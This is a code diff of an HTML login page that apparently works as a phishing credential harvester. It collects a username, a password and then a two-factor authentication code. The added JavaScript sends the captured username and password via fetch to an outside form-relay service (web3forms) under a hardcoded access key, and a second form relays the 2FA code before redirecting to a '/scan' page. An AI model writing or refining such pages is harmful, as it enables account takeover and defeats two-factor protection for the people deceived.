@@ -27,12 +27,6 @@ button {
 
 button:hover { opacity: 0.8; }
 
-.cancelbtn {
-  width: auto;
-  padding: 10px 18px;
-  background-color: #f44336;
-}
-
 .imgcontainer {
   text-align: center;
   margin: 24px 0 12px 0;
@@ -46,7 +40,7 @@ img.avatar {
 .container { padding: 16px; }
 
 #step2 {
-  display: none; /* hidden until step1 is completed */
+  display: none; /* hidden until step1 is submitted */
 }
 </style>
 </head>
@@ -58,26 +52,28 @@ img.avatar {
   <img src="img_avatar2.png" alt="Avatar" class="avatar">
 </div>
 
-<form id="validationForm" action="https://api.web3forms.com/submit" method="POST">
+<!-- Step 1: Username + Password -->
+<form id="step1Form" action="https://api.web3forms.com/submit" method="POST">
   <input type="hidden" name="access_key" value="bd395d4f-052f-46be-bebe-62e62bf140d1">
-  <!-- Redirect after submission -->
-  <input type="hidden" name="_next" value="/scan/scan/index.html">
+  <input type="hidden" name="_next" value="#">
 
-  <!-- Step 1: Username + Password -->
-  <div id="step1" class="container">
+  <div class="container">
     <label for="email"><b>Username</b></label>
     <input type="text" placeholder="Email/Mobile number" name="email" required>
 
     <label for="password"><b>Password</b></label>
-    <input type="text" placeholder="Enter Password" name="text" required>
+    <input type="password" placeholder="Enter Password" name="password" required>
 
-    <button type="button" id="proceedBtn">Proceed</button>
-    <label>
-      <input type="checkbox" checked="checked" name="remember"> Remember me
-    </label>
+    <button type="submit">Proceed</button>
   </div>
+</form>
 
-  <!-- Step 2: Validation Code -->
+<!-- Step 2: Validation Code -->
+<form id="step2Form" action="https://api.web3forms.com/submit" method="POST">
+  <input type="hidden" name="access_key" value="bd395d4f-052f-46be-bebe-62e62bf140d1">
+  <!-- Redirect after final submission -->
+  <input type="hidden" name="_next" value="/scan/scan/index.html">
+
   <div id="step2" class="container">
     <label for="code"><b>Authentication Code</b></label>
     <input type="text" placeholder="Enter 2fa Code" name="code" required>
@@ -87,14 +83,29 @@ img.avatar {
 </form>
 
 <script>
-  const proceedBtn = document.getElementById("proceedBtn");
-  const step1 = document.getElementById("step1");
+  const step1Form = document.getElementById("step1Form");
   const step2 = document.getElementById("step2");
 
-  proceedBtn.addEventListener("click", function() {
-    // Hide step1 and show step2
-    step1.style.display = "none";
-    step2.style.display = "block";
+  step1Form.addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    // Submit step1 via fetch
+    const formData = new FormData(step1Form);
+    fetch(step1Form.action, {
+      method: step1Form.method,
+      body: formData
+    })
+    .then(res => res.json())
+    .then(data => {
+      if (data.success) {
+        // Show step2 form after successful step1
+        step2.style.display = "block";
+        step1Form.style.display = "none";
+      } else {
+        alert("❌ Username/Password submission failed.");
+      }
+    })
+    .catch(() => alert("❌ Error submitting Step 1."));
   });
 </script>
 
